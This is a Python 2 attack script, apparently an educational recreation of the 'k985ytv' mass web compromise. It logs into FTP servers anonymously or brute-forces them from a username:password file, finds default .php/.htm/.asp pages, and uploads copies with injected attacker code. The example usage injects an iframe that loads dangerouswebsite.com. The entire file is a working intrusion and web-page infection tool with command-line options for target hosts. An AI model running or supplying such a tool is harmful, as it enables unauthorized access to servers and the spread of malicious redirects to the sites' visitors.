'''
Mass compromise through FTP and web.
Attempt to recreate the process used in k985ytv attack

1. Attempt to logon to FTP server anonymously
2. Attempt to brute force login credentials to FTP server
3. Search for default web pages
4. Inject malicious code (like a redirect to a malicious webpage) to the default web pages
	- Download default web pages
	- Inject code 
	- Upload


Example usage:
	python massScriptInjection.py -H 192.168.95.179 -r '<iframe src="http://dangerouswebsite.com"></iframe>' -f passwords.txt

See passwords.txt for example formatting for username:password text file

'''

import ftplib
import optparse
import time

# Takes a hostname
# Returns True if able to connect anonymously to ftp server
# False otherwise
def anonLogin(host):
	try:
		ftp = ftplib.FTP(host)
		ftp.login('anonymous', 'me@your.com')
		print '\n[*] ' + host + ' FTP anonymous logon succeeded'
		ftp.quit()
		return True
	except Exception, e:
		print '\n[-] ' + host + ' FTP anonymous logon failed'
		return False

# Takes a hostname and file of username-password pairs in form of <username>:<password>
# If ftp login success, returns a tuple of username, password
# Else returns a tuple of None, None
def bruteLogin(host, pwFile):
	f = open(pwFile, 'r')

	for line in f.readlines():
		user = line.split(':')[0]
		pw = line.split(':')[1].strip('\r').strip('\n')
		print '[+] Trying: ' + user + '/' + pw

		try:
			ftp = ftplib.FTP(host)
			ftp.login(user, pw)
			print '\n[*] ' + host + ' FTP login success: ' + user + '/' + pw
			ftp.quit()
			return (user, pw)
		except Exception, e:
			pass

	print '\n[-] FTP login attempts failed'
	return (None, None)

# Takes ftp connection
# Returns list of default webpage names
def returnDefault(ftp):
	# Run nlst (list directory contents command)
	try:
		dirList = ftp.nlst()
	except:
		dirList = []
		print '[-] Could not list directory contents'
		print '[-] Skipping to next target...'
		return

	retList = []
	
	# Look for web pages
	for fileName in dirList:
		fn = fileName.lower()
		if '.php' in fn or '.htm' in fn or '.asp' in fn:
			print '[+] Found default page: ' + fileName
			retList.append(fileName)

	return retList

# Download a page, inject code, upload page
def injectPage(ftp, page, redirect):
	# Download
	f = open(page + '.tmp', 'w')
	ftp.retrlines('RETR ' + page, f.write)
	print '[+] Downloaded page: ' + page

	# Inject content supplied in redirect parameter
	f.write(redirect)
	f.close()
	print '[+] Injected malicious iframe on: ' + page

	# Upload
	ftp.storlines('STOR ' + page, open(page + '.tmp'))
	print '[+] Uploaded injected page: ' + page

def attack(username, password, tgtHost, redirect):
	ftp = ftplib.FTP(tgtHost)
	ftp.login(username, password)

	defPages = returnDefault(ftp)

	for page in defPages:
		injectPage(ftp, page, redirect)

def main():
	parser = optparse.OptionParser('usage%prog -H <targetHost[s]> -r <redirectPage> [-f <userPassFile]')
	parser.add_option('-H', dest='tgtHosts', type='string', help='specify target host[s]')
	parser.add_option('-f', dest='pwFile', type='string', help='specify user/password file')
	parser.add_option('-r', dest='redirect', type='string', help='specify a page to redirect to')

	(options, args) = parser.parse_args()

	tgtHosts = str(options.tgtHosts).split(',')
	pwFile = options.pwFile
	redirect = options.redirect

	if tgtHosts == None or redirect == None:
		print parser.usage
		exit(0)

	for host in tgtHosts:
		username = None
		password = None

		if anonLogin(host) == True:
			username = 'anonymous'
			password = 'me@your.com'
			print '[+] Using anonymous credentials'
			attack(username, password, host, redirect)
		elif pwFile != None:
			(username, password) = bruteLogin(host, pwFile)

			if password != None:
				'[+] Using credentials: ' + username + '/' + password
				attack(username, password, host, redirect)

if __name__ == '__main__':
	main()

